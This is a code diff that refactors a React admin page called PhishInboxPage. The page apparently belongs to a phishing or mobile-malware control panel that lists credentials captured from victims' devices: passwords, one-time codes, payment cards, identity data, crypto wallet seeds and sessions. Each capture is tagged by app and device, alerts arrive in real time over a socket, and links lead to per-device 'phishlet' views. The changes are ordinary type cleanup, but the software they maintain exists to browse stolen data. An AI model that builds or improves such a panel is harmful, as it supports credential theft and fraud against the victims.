@@ -1,15 +1,16 @@
 import { useState, useCallback, useEffect, useRef } from 'react';
+import type { ReactNode } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { phishInboxApi } from '@/services/api';
 import { useAuthStore } from '@/store/auth';
-import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
+import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
 import { Input } from '@/components/ui/input';
-import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
+import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import {
   MailWarning, Star, Trash2, CheckCheck, Search, RefreshCw,
-  Lock, KeyRound, CreditCard, User, Fingerprint, ShieldAlert,
+  Lock, KeyRound, CreditCard, Fingerprint, ShieldAlert,
   MessageSquare, Bitcoin, Landmark, Mail, ShoppingBag, HelpCircle,
   Eye, EyeOff, Clock, Smartphone, ChevronRight,
 } from 'lucide-react';
@@ -45,7 +46,19 @@ interface Stats {
   byApp: Array<{ app: string; count: number }>;
 }
 
-const CATEGORY_META: Record<string, { label: string; icon: React.ReactNode; color: string }> = {
+interface CategoryMeta {
+  label: string;
+  icon: ReactNode;
+  color: string;
+}
+
+interface CaptureMeta {
+  label: string;
+  icon: ReactNode;
+  color: string;
+}
+
+const CATEGORY_META: Record<string, CategoryMeta> = {
   social:  { label: 'Social',  icon: <MessageSquare className="h-3 w-3" />, color: 'bg-blue-500/10 text-blue-400 border-blue-500/20' },
   crypto:  { label: 'Crypto',  icon: <Bitcoin className="h-3 w-3" />, color: 'bg-amber-500/10 text-amber-400 border-amber-500/20' },
   finance: { label: 'Finance', icon: <Landmark className="h-3 w-3" />, color: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' },
@@ -54,14 +67,14 @@ const CATEGORY_META: Record<string, { label: string; icon: React.ReactNode; colo
   unknown: { label: 'Other',   icon: <HelpCircle className="h-3 w-3" />, color: 'bg-gray-500/10 text-gray-400 border-gray-500/20' },
 };
 
-const CAPTURE_META: Record<string, { label: string; icon: React.ReactNode; color: string }> = {
+const CAPTURE_META: Record<string, CaptureMeta> = {
   password: { label: 'Password', icon: <Lock className="h-3 w-3" />,       color: 'bg-red-500/10 text-red-400' },
   otp:      { label: 'OTP',      icon: <KeyRound className="h-3 w-3" />,   color: 'bg-orange-500/10 text-orange-400' },
   card:     { label: 'Card',     icon: <CreditCard className="h-3 w-3" />, color: 'bg-yellow-500/10 text-yellow-400' },
   identity: { label: 'Identity', icon: <Fingerprint className="h-3 w-3" />,color: 'bg-cyan-500/10 text-cyan-400' },
   seed:     { label: 'Seed',     icon: <ShieldAlert className="h-3 w-3" />,color: 'bg-purple-500/10 text-purple-400' },
-  session:  { label: 'Account',  icon: <User className="h-3 w-3" />,       color: 'bg-blue-500/10 text-blue-400' },
-  personal: { label: 'Personal', icon: <User className="h-3 w-3" />,       color: 'bg-green-500/10 text-green-400' },
+  session:  { label: 'Account',  icon: <Fingerprint className="h-3 w-3" />,color: 'bg-blue-500/10 text-blue-400' },
+  personal: { label: 'Personal', icon: <Smartphone className="h-3 w-3" />, color: 'bg-green-500/10 text-green-400' },
   other:    { label: 'Other',    icon: <HelpCircle className="h-3 w-3" />, color: 'bg-gray-500/10 text-gray-400' },
 };
 
@@ -95,7 +108,7 @@ export default function PhishInboxPage() {
   const [revealed, setRevealed] = useState<Set<number>>(new Set());
   const [toast, setToast] = useState<string | null>(null);
   const toastTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const socketRef = useRef<any>(null);
+  const socketRef = useRef<{ off: (event: string) => void } | null>(null);
 
   const showToast = useCallback((msg: string) => {
     setToast(msg);
@@ -105,7 +118,7 @@ export default function PhishInboxPage() {
 
   const load = useCallback(async () => {
     try {
-      const filters: any = {};
+      const filters: Record<string, string | boolean> = {};
       if (categoryFilter !== 'all') filters.category = categoryFilter;
       if (typeFilter !== 'all') filters.captureType = typeFilter;
       if (readFilter === 'unread') filters.unread = true;
@@ -115,27 +128,40 @@ export default function PhishInboxPage() {
         phishInboxApi.list(filters),
         phishInboxApi.stats(),
       ]);
-      setItems((listRes.data as any)?.data || []);
-      setStats((statsRes.data as any)?.data || null);
-    } catch { showToast('Failed to load inbox'); }
-    finally { setLoading(false); }
+      setItems((listRes.data as { data?: InboxItem[] })?.data || []);
+      setStats((statsRes.data as { data?: Stats })?.data || null);
+    } catch { 
+      showToast('Failed to load inbox'); 
+    }
+    finally { 
+      setLoading(false); 
+    }
   }, [categoryFilter, typeFilter, readFilter, starredOnly, search, showToast]);
 
-  useEffect(() => { load(); }, [load]);
+  useEffect(() => { 
+    load(); 
+  }, [load]);
 
   // Real-time: listen for new captures via socket
   useEffect(() => {
     const token = localStorage.getItem('auth-token');
     if (!token) return;
+    
+    let mounted = true;
     import('@/services/socket').then(({ initAdminSocket }) => {
+      if (!mounted) return;
       const s = initAdminSocket();
       socketRef.current = s;
-      s.on('phish:inbox_new', (data: any) => {
+      s.on('phish:inbox_new', (data: { captureType: string; appName: string }) => {
         showToast(`New ${data.captureType} capture: ${data.appName}`);
         load();
       });
     }).catch(() => {});
-    return () => { socketRef.current?.off('phish:inbox_new'); };
+    
+    return () => { 
+      mounted = false;
+      socketRef.current?.off('phish:inbox_new'); 
+    };
   }, [load, showToast]);
 
   const markRead = async (id: number) => {
@@ -151,7 +177,7 @@ export default function PhishInboxPage() {
 
   const toggleStar = async (id: number) => {
     const res = await phishInboxApi.toggleStar(id);
-    const starred = (res.data as any)?.data?.starred;
+    const starred = (res.data as { data?: { starred: boolean } })?.data?.starred;
     setItems(prev => prev.map(i => i.id === id ? { ...i, starred: !!starred } : i));
   };
 
@@ -254,7 +280,7 @@ export default function PhishInboxPage() {
             className="pl-9 w-64"
           />
         </div>
-        <Tabs value={categoryFilter} onValueChange={setCategoryFilter}>
+        <Tabs value={categoryFilter} onValueChange={(v: string) => setCategoryFilter(v)}>
           <TabsList>
             <TabsTrigger value="all">All</TabsTrigger>
             <TabsTrigger value="social">Social</TabsTrigger>
@@ -264,7 +290,7 @@ export default function PhishInboxPage() {
             <TabsTrigger value="commerce">Commerce</TabsTrigger>
           </TabsList>
         </Tabs>
-        <Tabs value={typeFilter} onValueChange={setTypeFilter}>
+        <Tabs value={typeFilter} onValueChange={(v: string) => setTypeFilter(v)}>
           <TabsList>
             <TabsTrigger value="all">All types</TabsTrigger>
             <TabsTrigger value="password">Password</TabsTrigger>
@@ -393,7 +419,7 @@ export default function PhishInboxPage() {
                     <span className="font-mono">{item.packageName}</span>
                     <span>·</span>
                     <span>Device: {item.clientId.slice(0, 8)}...</span>
-                    {hasPermission('device:view') && (
+                    {hasPermission?.('device:view') && (
                       <Button
                         variant="link" size="sm" className="h-auto p-0 text-xs"
                         onClick={e => { e.stopPropagation(); navigate(`/device/${item.clientId}/phishlet`); }}
@@ -417,4 +443,4 @@ export default function PhishInboxPage() {
       )}
     </div>
   );
-}
+} 
